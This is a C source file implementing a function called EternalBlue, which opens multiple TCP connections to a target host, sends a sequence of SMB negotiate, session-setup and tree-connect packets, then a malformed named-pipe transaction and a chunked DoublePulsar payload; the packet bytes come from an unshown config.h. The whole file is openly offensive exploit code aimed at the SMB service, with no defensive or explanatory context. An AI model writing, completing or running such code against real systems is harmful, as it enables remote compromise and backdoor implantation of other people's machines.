#define _GNU_SOURCE
#include "config.h"

#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static int send_all(int sock, const unsigned char *data, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        ssize_t n = send(sock, data + sent, length - sent, MSG_NOSIGNAL);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;
        sent += (size_t)n;
    }

    return 0;
}

static int send_chunked(int sock, const unsigned char *data, size_t length,
                        size_t chunk_size)
{
    size_t offset = 0;

    if (chunk_size == 0)
        return -1;

    while (offset < length) {
        size_t amount = length - offset;
        if (amount > chunk_size)
            amount = chunk_size;
        if (send_all(sock, data + offset, amount) < 0)
            return -1;
        offset += amount;
    }

    return 0;
}

int EternalBlue(const char *ip, int port)
{
    int sockets[NUM_SOCKETS];
    int opened = 0;
    int result = -1;
    struct sockaddr_in address;

    if (ip == NULL || port < 1 || port > 65535 || NUM_SOCKETS < 3 ||
        SMB_CHUNK_SIZE <= 0) {
        printf("EternalBlue: invalid arguments or configuration\n");
        return -1;
    }

    for (int i = 0; i < NUM_SOCKETS; i++)
        sockets[i] = -1;

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((unsigned short)port);
    if (inet_pton(AF_INET, ip, &address.sin_addr) != 1) {
        printf("EternalBlue: invalid IPv4 address: %s\n", ip);
        return -1;
    }

    for (int i = 0; i < NUM_SOCKETS; i++) {
        printf("EternalBlue: opening TCP connection %d to %s:%d\n", i, ip, port);
        sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
        if (sockets[i] < 0) {
            printf("EternalBlue: socket creation failed for connection %d\n", i);
            goto cleanup;
        }
        opened++;
        if (connect(sockets[i], (struct sockaddr *)&address, sizeof(address)) < 0) {
            printf("EternalBlue: connection %d failed\n", i);
            goto cleanup;
        }

        printf("EternalBlue: sending SMB negotiate packet on socket %d\n", i);
        if (send_chunked(sockets[i], SMB_NEGOTIATE_PKT,
                         sizeof(SMB_NEGOTIATE_PKT), SMB_CHUNK_SIZE) < 0)
            goto cleanup;

        printf("EternalBlue: sending SMB session setup packet on socket %d\n", i);
        if (send_chunked(sockets[i], SMB_SESSION_SETUP_PKT,
                         sizeof(SMB_SESSION_SETUP_PKT), SMB_CHUNK_SIZE) < 0)
            goto cleanup;

        printf("EternalBlue: sending SMB tree connect packet on socket %d\n", i);
        if (send_chunked(sockets[i], SMB_TREE_CONNECT_PKT,
                         sizeof(SMB_TREE_CONNECT_PKT), SMB_CHUNK_SIZE) < 0)
            goto cleanup;
    }

    printf("EternalBlue: sending malformed named-pipe transaction packets on socket 0\n");
    if (send_chunked(sockets[0], SMB_TRANS_NAMED_PIPE_PKT,
                     sizeof(SMB_TRANS_NAMED_PIPE_PKT), SMB_CHUNK_SIZE) < 0)
        goto cleanup;

    for (int i = 2; i < NUM_SOCKETS; i++) {
        printf("EternalBlue: sending DoublePulsar payload in chunks on socket %d\n", i);
        if (send_chunked(sockets[i], DP_EXEC_PKT, sizeof(DP_EXEC_PKT),
                         SMB_CHUNK_SIZE) < 0)
            goto cleanup;
    }

    result = 0;

cleanup:
    for (int i = 0; i < opened; i++) {
        if (sockets[i] >= 0) {
            printf("EternalBlue: closing socket %d\n", i);
            if (close(sockets[i]) < 0)
                result = -1;
            sockets[i] = -1;
        }
    }

    return result;
}